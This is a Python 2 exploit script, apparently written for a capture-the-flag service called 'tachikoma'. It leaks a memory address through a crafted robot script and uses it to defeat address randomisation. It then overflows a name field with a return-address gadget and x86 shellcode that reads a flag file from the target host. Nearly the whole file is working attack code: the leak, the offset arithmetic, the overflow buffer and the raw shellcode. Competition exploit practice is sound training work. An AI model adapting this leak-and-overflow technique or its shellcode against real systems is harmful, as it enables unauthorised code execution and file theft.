import socket
import struct
import time
import telnetlib
import os
import sys

service = 'tachikoma'         # target service (required)
timeout = 3                 # define timeout here
author = 'm3m3d4'          # author

host = 'localhost'
port = 9999

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def exploit(host):
	ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ss.connect((host, 9))
	f = ss.makefile('rw', bufsize=0)

	offset = 0x13f48
	s = '310a3436360a0a5573656c6573730a7b0a20207072696e74282022626262622220290a7d0a436f72650a7b0a7d0a496e69740a7b0a20206e616d65282022626f622220290a20205f74726573756c745f3330203d20300a20205f74726573756c745f3332203d203132382e300a20207072696e742820225052454c45414b2220290a20207072696e7428205f74726573756c745f313020290a20207072696e7428205f74726573756c745f383420290a20207072696e742820224c45414b45442220290a20207072696e74282022434f4445d66161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161612220290a7d0a'.decode('hex')

	f.write(s)
	readuntil(f, 'debug: bob: PRELEAK\n')
	readuntil(f, '\n')
	readuntil(f, 'bob: ')
	v = readuntil(f, '\n')
	readuntil(f, 'CODE')
	v = v.strip().split('.')
	if v[0][0] == '-':
		v[0] = v[0][1:]
	v[1] = '1' + v[1]
	print v
	high = (int(v[0]) << 1)
	low = int(v[1]) << 15
	leak_addr = low + high
	binary_base = leak_addr - offset
	print 'binary_base: %s' % hex(binary_base)
	push_esp_ret = binary_base + 0x14b0
	sc = '\x6a\x05\x58\x99\x52\x6a\x61\x68\x69\x6b\x6f\x6d\x68\x74\x61\x63\x68\x68\x61\x67\x73\x2f\x68\x65\x2f\x66\x6c\x68\x2f\x68\x6f\x6d\x89\xe3\x89\xd1\xcd\x80\x89\xc3\x89\xe1\xb2\x80\xb0\x03\xcd\x80\x92\x89\xe1\xb3\x01\xb0\x04\xcd\x80\xb0\x01\xcd\x80'
	name = 'Z' * 0x2000
	name += 'Z' * 0x1800
	name += 'Z' * 0x200
	name += 'Z' * 0x100
	name += p(push_esp_ret) * (0x38/4)
	name += sc

	payload = """
AutoScan                    
{
    print( "Hit by missle" )
}

Core
{
    print( "Core" )
    ahead( 1 )
    endturn( )
}  

MissileHit
{
    print( "Hit by missle" )
}

FoundRobot
{
    print( "Find" )
}

Dead
{
}

Pinged
{
    print( "Pinged from" _cldbearing "heading" _cldheading )
}

Init
{
    name( "%s" )
    regcore( "Core" )
    regcldmissile( "MissileHit", 1 )
    regdtcrobot( "FoundRobot", 2 )
    regascan( "AutoScan", 3 )
    regping( "Pinged", 1 )
}
""" % (name)

	go = '1\n'
	go += '%d\n' % len(payload)
	go += payload

	f.write(go)
	readuntil(f, 'lines\n')
	flag = f.read(26).strip()
	print flag
	return flag

	t = telnetlib.Telnet()
	t.sock = ss
	t.interact()

if __name__ == '__main__':
    exploit('192.168.165.135')


#from pwn import *
#p = process("./tachikoma")
#raw_input("debug")
#p.send(s)
#p.interactive()
